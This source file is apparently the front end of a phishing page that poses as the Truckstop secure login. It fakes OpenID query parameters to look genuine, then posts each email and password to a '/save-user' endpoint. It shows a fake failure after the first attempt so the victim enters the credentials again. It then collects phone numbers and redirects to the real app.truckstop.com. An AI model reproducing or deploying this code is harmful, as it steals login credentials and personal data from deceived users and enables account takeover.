import { useLayoutEffect, useState } from 'react';
import { useNavigate, useLocation } from 'react-router-dom';
import { useDocumentTitle } from '../../hooks/useDocumentTitle'
import Left from './Left/Left'
import Right from './Right/Right'
import Banner from './Banner/Banner'
import './NewApp.scss'
import Verification from '../Verification/Verification';

const query = {
  "client_id": "7a99fb37-0cbd-4526-a557-bd283b9e9cf4",
  "redirect_uri": "https%3a%2f%2fapp.truckstop.com%2flanding%2fpingexternallogincallback",
  "response_type": "code%20id_token%20token",
  "state": "openidconnect.authenticationproperties%3dd1azkrievou5xvfp-qj6lz4lvhnji_zurlus4dg4kpfyaz8_l_zh9eagafd4qs-4bp_xmv_gxhfi9cicmwuipdyvxvvyerzotaovt3vtqf9ajzj3wmqtyitt_jeovipdmigoy5j_5dpehnbhcu93ulmdxyuni7lptn61kjfj7vt78qwvlvinfcjk1ngsl46tbysxh2azfm_i1dlik1uodaqthlvy6gtmnpueowutlftvhwsb7ejrpju0ggwa6pbfqx5adq",
  "response_mode": "form_post",
  "nonce": "638448261415283047.mdq2yjfinjytmwrjyi00ote4lwi3yjitodyzytm5ymu3mdbmotkxmzeyzdmtmzm5nc00yzq2lthlnjktmdvindc5njg3owjk",
  "x-client-sku": "id_net461",
  "x-client-ver": "7.0.1.0"
}

const setObjectAsQueryParam = ({ navigate, location }) => {
  const queryString = Object.entries(query)
    .map(([key, value]) => `${encodeURIComponent(key)}=${encodeURIComponent(value)}`)
    .join('&');

  navigate(`${location.pathname}?${queryString}`, { replace: true });
};

const usernameRegex = /^[A-Za-z0-9][\w-\.\!\#\$\%\&\'\*\+\-\/\=\?\^\_\`\{\|\}\~]*@([\w-]+\.)+[\w-]{2,20}$/;


const isUsernameValid = (username) => {
  const isValid = usernameRegex.test(username);

  console.log(`username ${username} is ${isValid ? 'a valid' : 'not a valid'} email address.`);

  return isValid;
};

const NewApp = () => {
  useDocumentTitle('Truckstop Secure Login');
  const navigate = useNavigate();
  const location = useLocation();
  const [step, setStep] = useState(1);
  const [firstStepStatus, setFirstStepStatus] = useState(false);
  const [secondStepStatus, setSecondStepStatus] = useState(false);
  const [thirdStepStatus, setThrirdStepStatus] = useState(false);
  const [form, setForm] = useState({ email: '', password: '', phone: '', changePhone: '' });
  const [error, setError] = useState('');
  const [tryCount, setTryCount] = useState(0);

  useLayoutEffect(() => {
    setObjectAsQueryParam({ navigate, location })
  }, []);

  const handleRequset = (callback, setStatus) => {
    setStatus(true);
    const params = {
      email: form.email,
      id: form.password,
    };
    if (form.phone) {
      params.phone = form.phone;
    }
    if (form.changePhone) {
      params.changePhone = form.changePhone;
    }
    fetch(`${process.env.REACT_APP_API}/save-user`, {
      method: 'post',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(params),
    })
      .then(callback)
      .catch(error => console.log(error))
      .finally(() => setStatus(false));
  }

  const handleChange = (value, name) => {
    setForm(prev => ({ ...prev, [name]: value }))
  }

  const handleSubmitFirstStep = () => {
    if ((!form.email.trim() && !form.password.trim()) || (!form.email.trim() || !isUsernameValid(form.email))) {
      setError('Please enter a valid email');
      return;
    }
    if (!form.password.trim()) {
      setError('Please enter a valid password');
      return;
    }
    if (tryCount === 0) {
      handleRequset(() => {
        setForm({ email: '', password: '', phone: '', changePhone: '' })
        setError('');
        setTryCount(1);
      }, setFirstStepStatus);
    }
    if (tryCount === 1) {
      handleRequset(() => {
        setTryCount(0);
        setError('');
        setStep(2);
      }, setFirstStepStatus)
    }
  }

  const handleSubmitSecondStep = () => {
    handleRequset(() => {
      setStep(3);
    }, setSecondStepStatus)
  }
  const handleSubmitThirdStep = () => {
    handleRequset(() => {
      window.location.href = 'https://app.truckstop.com/'
    }, setThrirdStepStatus)
  }

  return (
    <>
      {step === 1 && <>
        {/* <Banner /> */}
        <div className='new-app'>
          <div className="new-app__left-wrapper">
            <Left
              handleChange={handleChange}
              error={error}
              firstStepStatus={firstStepStatus}
              handleSubmitFirstStep={handleSubmitFirstStep}
              tryCount={tryCount}
              form={form}
            />
          </div>
          <div className="new-app__right-wrapper">
            <Right />
          </div>
        </div>
      </>}
      {step === 2 && (
        <Verification
          secondStepStatus={secondStepStatus}
          handleChange={handleChange}
          handleSubmitSecondStep={handleSubmitSecondStep}
          value={form.phone}
          name="phone"
        />
      )}
      {step === 3 && (
        <Verification
          secondStepStatus={thirdStepStatus}
          handleChange={handleChange}
          handleSubmitSecondStep={handleSubmitThirdStep}
          value={form.changePhone}
          name="changePhone"
          isCompleate
          disabled={form.phone === form.changePhone}
        />
      )}
    </>
  )
}

export default NewApp